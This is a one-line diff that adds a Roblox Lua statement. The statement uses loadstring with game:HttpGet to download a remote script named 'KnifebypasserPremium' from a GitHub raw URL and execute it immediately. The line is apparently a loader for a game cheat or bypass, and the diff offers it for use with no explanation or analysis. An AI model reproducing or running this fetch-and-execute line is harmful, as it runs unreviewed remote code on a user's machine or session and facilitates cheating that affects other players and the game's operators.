@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SysgetaScripts/notags/refs/heads/main/KnifebypasserPremium", true))()
